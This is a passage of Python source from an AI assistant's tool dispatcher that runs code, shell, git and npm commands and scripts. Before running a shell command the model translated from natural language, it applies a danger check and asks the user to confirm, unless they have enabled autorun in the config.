            [sys.executable, "-c", code], cwd=cwd, timeout=30,
        )
        block = CommandBlock(
            command=code, output=out, exit_code=exit_code,
            duration_ms=duration_ms, cwd=os.getcwd(),
        )
        _store_block(block)
        override = _post_execute(block, cwd)
        if override:
            return override
        return _ok(out) if exit_code == 0 else _err(out)

    if action in ("run_shell", "git_command", "npm_command"):
        # ── Multi-step agent (run_shell only) ─────────────────────────────────
        if action == "run_shell" and _MULTISTEP_PATTERN.search(code):
            env_ctx = _build_env_context()
            steps   = _plan_steps(code, env_ctx)
            if steps:
                return _run_plan(steps, cwd)

        # NL → command translation (run_shell only, when it looks like natural language)
        ai_generated = False
        if action == "run_shell" and _looks_like_natural_language(code):
            env_ctx = _build_env_context()
            generated = _nl_to_command(code, env_ctx)
            if generated:
                danger = _danger_check(generated)
                if danger:
                    return danger
                # R2-1: every Sonnet-generated shell command is surfaced to the
                # user before subprocess launch. The card shows the original
                # natural-language phrasing AND the translated command so the
                # user can see how JARVIS interpreted the request. Bypass by
                # opting into `config.allow_ai_command_autorun=True`.
                if not _autorun_allowed():
                    prompt = (
                        f'AI translated "{code}" into:\n  {generated}\n\n'
                        "Run it?"
                    )
                    return _ai_command_confirmation(
                        prompt, generated, cwd, confirm_type="ai_command",
                    )
                code = generated
                ai_generated = True

        # Windows cmd built-ins (cd, dir, echo, …) aren't standalone executables
        # — wrap them as `cmd /c …` so subprocess can find a real binary on PATH.
        # Only applies to run_shell; git_command and npm_command are real exes.
        if action == "run_shell":
            code = _wrap_win_builtin(code)

        try:
            args = shlex.split(code) if isinstance(code, str) else code
        except Exception as exc:
            return _err(f"Could not parse command: {exc}")
        out, exit_code, duration_ms = _stream_execute(args, cwd=cwd, timeout=60)
        block = CommandBlock(
            command=code, output=out, exit_code=exit_code,
            duration_ms=duration_ms, cwd=os.getcwd(), ai_generated=ai_generated,
        )
        _store_block(block)
        override = _post_execute(block, cwd)
        if override:
            return override
        return _ok(out) if exit_code == 0 else _err(out)

    if action == "run_script":
        p = _resolve_script_path(str(code), cwd_raw)
        if p is None:
            return _err(f"Script not found: {code}")
        run_cwd = cwd or str(p.parent)
        cmd_args = [sys.executable, str(p)] if p.suffix == ".py" else [str(p)]
        out, exit_code, duration_ms = _stream_execute(cmd_args, cwd=run_cwd, timeout=60)
        block = CommandBlock(
            command=str(p), output=out, exit_code=exit_code,
            duration_ms=duration_ms, cwd=run_cwd,
        )
        _store_block(block)
        override = _post_execute(block, cwd)
        if override:
            return override
        return _ok(out) if exit_code == 0 else _err(out)

    return _err(f"Unknown code action: {action}")
